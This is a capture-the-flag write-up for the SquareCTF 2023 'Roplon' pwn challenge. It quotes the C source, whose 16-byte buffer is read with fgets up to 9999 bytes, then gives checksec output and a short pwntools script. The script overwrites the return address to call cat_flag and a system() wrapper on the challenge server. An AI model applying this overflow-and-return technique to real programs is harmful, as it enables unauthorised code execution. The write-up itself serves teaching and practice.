---
title: Roplon
type: writeup
date: 2023-11-17T20:00:00+02:00
description: Writeup for Roplon [SquareCTF 2023]
author: PineBel
tags:
- pwn
draft: false
---

### Challenge Description

I THINK that buffer is big enough, right?


### Solution

In the roplon.c file, we observe the invocation of several functions. Notably, two functions stand out: cat_flag, which assigns the command_buf to "cat flag.txt," and do_the_thing, which launches a shell with the command provided as an argument. Additionally, the program allows writing to a buffer. The program's vulnerability lies in a buffer of 16 bytes, but the fgets function permits writing up to 9999 bytes   .


```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char command_buf[128];

char *copy_command_to_buf(char *command,  char *buf)
{
    strcpy(buf, command);
}

void cat_flag()
{
    copy_command_to_buf("cat flag.txt", command_buf);
}

void ls()
{
    copy_command_to_buf("ls -lh flag.txt", command_buf);
}

void shasum_flag()
{
    copy_command_to_buf("shasum flag.txt", command_buf);
}

void do_the_thing(char *the_thing)
{
    system(the_thing);
}

int main(void)
{
    puts("Welcome to the ROPL!");

    while (1)
    {
        puts("what thing would you like to do?\n1: ls -lh flag.txt\n2: shasum flag.txt");
        char choice[16];
        fgets(choice, 9999, stdin);
        if (choice[0] == '1')
        {
            ls();
            do_the_thing(command_buf);
        }
        else if (choice[0] == '2')
        {
            shasum_flag();
            do_the_thing(command_buf);
        }
        else
        {
            break;
        }
    }
}

```

Let's check the file protections:

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified   Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   44 Symbols        No    0  2roplon

```

Given the absence of a canary and the lack of PIE, we can craft an exploit to overwrite the return address of the main function, enabling us to call cat_flag and do_the_thing.

```py

elf = pwn.ELF("./roplon")
p = elf.process()

cat_addr = elf.symbols['cat_flag']
sys_addr = elf.symbols['do_the_thing']

target = pwn.remote("184.72.87.9", 8007)

target.sendline(b"A"*24 + pwn.p64(cat_addr) + pwn.p64(sys_addr))
target.interactive()

```

#### Flag
After executing, we get the flag.

